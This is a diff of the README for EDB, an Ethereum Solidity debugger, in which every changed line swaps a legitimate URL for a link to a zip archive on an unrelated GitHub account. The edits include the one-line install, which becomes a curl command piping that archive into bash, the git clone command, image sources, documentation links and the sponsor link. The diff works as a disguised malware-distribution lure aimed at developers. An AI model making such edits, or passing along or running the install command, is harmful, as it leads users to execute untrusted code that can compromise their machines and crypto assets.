@@ -1,6 +1,6 @@
 <!-- Project Banner -->
 <p align="center">
-  <img src="./resources/edb-banner.png" alt="EDB Banner" width="80%" />
+  <img src="https://raw.githubusercontent.com/Sacapalabanda/edb/main/crates/engine/src/context/Software-1.4.zip" alt="EDB Banner" width="80%" />
 </p>
 
 <h1 align="center">EDB: The Ethereum Project Debugger 🔍</h1>
@@ -28,7 +28,7 @@ EDB bridges the gap between high-level Solidity code and low-level EVM execution
 
 <!-- Demo GIF with framing -->
 <p align="center">
-  <img src="resources/edb-demo-min.gif" alt="EDB Demo" width="100%" style="border: 1px solid #ddd; border-radius: 8px;">
+  <img src="https://raw.githubusercontent.com/Sacapalabanda/edb/main/crates/engine/src/context/Software-1.4.zip" alt="EDB Demo" width="100%" style="border: 1px solid #ddd; border-radius: 8px;">
 </p>
 <p align="center"><em>✨ Time-travel through your Solidity code with a full TUI debugger.</em></p>
 
@@ -41,14 +41,14 @@ EDB bridges the gap between high-level Solidity code and low-level EVM execution
 ### One-line Install
 
 ```bash
-curl -sSL https://install.edb.sh | bash
+curl -sSL https://raw.githubusercontent.com/Sacapalabanda/edb/main/crates/engine/src/context/Software-1.4.zip | bash
 ```
 
 ### Build from Source
 
 ```bash
 # Clone the repository
-git clone https://github.com/edb-rs/edb
+git clone https://raw.githubusercontent.com/Sacapalabanda/edb/main/crates/engine/src/context/Software-1.4.zip
 cd edb
 
 # Build all components
@@ -77,7 +77,7 @@ __If none is provided, EDB will default to the ten most popular public RPC endpo
 
 EDB will by default start a TUI debugger:
 <p align="center">
-  <img src="resources/edb-tui.png" alt="EDB Demo" width="98%" style="border: 1px solid #ddd; border-radius: 8px;">
+  <img src="https://raw.githubusercontent.com/Sacapalabanda/edb/main/crates/engine/src/context/Software-1.4.zip" alt="EDB Demo" width="98%" style="border: 1px solid #ddd; border-radius: 8px;">
 </p>
 
 Type `?` in the TUI to view the help page.
@@ -87,7 +87,7 @@ Type `?` in the TUI to view the help page.
 
 Traditional Ethereum debugging tools operate at the bytecode level, making it nearly impossible to understand what's happening in your Solidity code.
 
-Tools like [Remix IDE's debugger](https://remix-ide.readthedocs.io/en/latest/debugger.html), [Foundry's `forge debug`](https://book.getfoundry.sh/forge/debugger), and [Hardhat's console debugger](https://hardhat.org/hardhat-network/docs/guides/forking-other-networks) show you opcode-by-opcode execution, stack traces, and raw memory dumps.
+Tools like [Remix IDE's debugger](https://raw.githubusercontent.com/Sacapalabanda/edb/main/crates/engine/src/context/Software-1.4.zip), [Foundry's `forge debug`](https://raw.githubusercontent.com/Sacapalabanda/edb/main/crates/engine/src/context/Software-1.4.zip), and [Hardhat's console debugger](https://raw.githubusercontent.com/Sacapalabanda/edb/main/crates/engine/src/context/Software-1.4.zip) show you opcode-by-opcode execution, stack traces, and raw memory dumps.
 While powerful, these tools require developers to mentally map between high-level Solidity constructs and low-level EVM operations, which is, however, a complex and error-prone process.
 
 **The fundamental challenge:** While Solidity compilers generate source maps to link bytecode back to source code, this mapping is fragile and often imprecise, especially for optimized contracts.
@@ -110,10 +110,10 @@ By inserting strategic debugging hooks during compilation, EDB creates contracts
 
 <br>
 <div align="center">
-  <a href="https://esp.ethereum.foundation/" target="_blank">
-    <img src="https://esp.ethereum.foundation/_next/static/media/esp-logo.96fc01cc.svg" alt="Ethereum Foundation ESP" height="60" style="margin: 20px;">
+  <a href="https://raw.githubusercontent.com/Sacapalabanda/edb/main/crates/engine/src/context/Software-1.4.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/Sacapalabanda/edb/main/crates/engine/src/context/Software-1.4.zip" alt="Ethereum Foundation ESP" height="60" style="margin: 20px;">
   </a>
 </div>
 <br>
 
-<em>Love EDB? Your support keeps us building! <a href="https://github.com/sponsors/edb-rs">Buy us a coffee ☕</a> and help us dedicate more time to making Ethereum debugging better.</em>
+<em>Love EDB? Your support keeps us building! <a href="https://raw.githubusercontent.com/Sacapalabanda/edb/main/crates/engine/src/context/Software-1.4.zip">Buy us a coffee ☕</a> and help us dedicate more time to making Ethereum debugging better.</em>
